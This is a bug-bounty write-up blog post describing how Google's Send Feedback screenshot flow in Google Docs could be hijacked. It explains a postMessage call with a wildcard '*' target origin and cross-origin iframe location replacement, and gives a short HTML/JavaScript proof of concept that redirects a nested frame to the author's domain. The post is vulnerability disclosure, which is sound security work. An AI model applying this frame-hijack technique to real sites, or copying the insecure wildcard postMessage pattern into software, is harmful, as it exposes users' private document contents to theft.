+++
title = '[Google VRP] Hijacking Google Docs Screenshots'
date = 2020-12-27T19:13:19+05:30
+++

## Brief:

I was able to hijack Google Docs screenshot of any document exploiting postmessage misconfiguration and a browser behavior.

Google have a feature called "Send Feedback" in most of their product. As the name suggests it helps Google to get feedback from users when they face some issue. The feature have an options to add screenshots with a brief description about the issue.

![feedback](/images/gvrp-sc-hijack/feedback.png)  

As this is a common feature available in most of their sites, they have deployed  the functionality in `https://www.google.com` and have integrated to other domains via Iframe.  

## Working:
Let us imagine using Google Docs (`https://docs.google.com/document`), to submit a feedback we can navigate to `Help`--> `Send Feedback`. Then you'll see a Iframe popping up and magically loading the screenshot of the document you were working on. As the origin of the iframe (`www.google.com`) is different from the Google docs (`docs.google.com`) there must be someway of cross origin communication to successfully render the screenshot. PostMessage, comes into the play! The work flow is like, Google docs sends RGB values of its every pixels to the main iframe www.google.com  via postmessage (as  far as I have interpreted). Which redirect those RGB values to its iframe `feedback.googleusercontent.com`  via postmessage. Which then renders an image from those pixels and sends back it's base64 encoded data-URI to the main Iframe.

Once this process is finished, we have to write a description for the feedback and on clicking send the description with the image (data-uri) is sent to `https://www.google.com` (Submit Feedback) via postmessage.  

![feedback](/images/gvrp-sc-hijack/drawing.jpg)  

## Hunting for bugs:  

The first thought I had after understanding this functionality was to find an XSS in the sandbox domain `feedback.googleusercontent.com`. Using that XSS I could hijack those RGB values of pixels, render the image and steal the screenshot.  I was pretty sure that I'll find a XSS in that as it was a sandbox domain. But it turns out I couldn't. After trying for few days, I asked [S1r1us](https://twitter.com/S1r1us_)
 for help. We tried to find XSS for about 5 days, failed and then gave up. After a week, I noticed this video by  [filedescriptor](https://twitter.com/filedescriptor) in my twitter feed. (I'm a fan of Intigriti's twitter handle and their XSS challenges)  

{{< youtube KpkrTUHoWsQ >}}  

After watching the video, I learned a new trick that I didn't knew before. That is, you can change the location of an iframe  which is present in cross origin domain (If it lacks X-Frame-Header). For example, if abc.com have efg.com as iframe and abc.com didn't have X-Frame header, I could change the efg.com to `evil.com` cross origin using, frames.location  

Now I was thinking of ways to exploit this behavior. What if I tried to replace those iframes in feedback feature to my domain? would it send the postmessage data to me? I decided to give a try. I tired replacing the `feedback.googleusercontent.com` domain with `geekycat.in`, it FAILED.  

While the data is sent to `feedback.googleusercontent.com` it is sent like  

```javascript
windowRef.postmessage("<Data>","https://feedback.googleusercontent.com");
```

So even if I change the iframe's location the data won't be sent to my domain because of the mismatch in postmessage configuration. With no hope I tried changing the (Submit Feedback `www.google.com`) iframe to my domain and this time it worked! Why?

The final postmessage on submitting feedback was configured like, ```windowRef.postmessage("<Data>","*");``` as there is no domain check the browser happily sent the data to my domain, which I was able to capture and hijack the screenshot.  

But wait! I said the parent domain shouldn't have X-Frame header, how am I going to achieve that? Luckily Google docs didn't have one. Yes! it still doesn't have. Before flooding Google with your clickjacking reports, note that the site have some other protection against clickjacking like, most options are disabled when embedded in Iframe.  

This behavior is referenced in this Liveoverflow video.  

{{< youtube aCexqB9qi70 >}}  

## Exploit:  

Put it together.  

```html
<html>
    <iframe src="https://docs.google.com/document/ID" />
    <script>
       //pseudo code
        
        
        setTimeout(function(){ exp(); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    </script>
</html>
```  

The function is called after setTimeout of 6 seconds is to give time for the iframe to load. Another issue is, the iframe is created only if user explicitly clicks on the send feedback option. So we have to try to change the location of iframe every 100 ms even when it is not present to ensure the frame is hijacked when it is created.  

## Video POC  

{{< youtube isM-BXj4_80 >}}  



Thanks :)




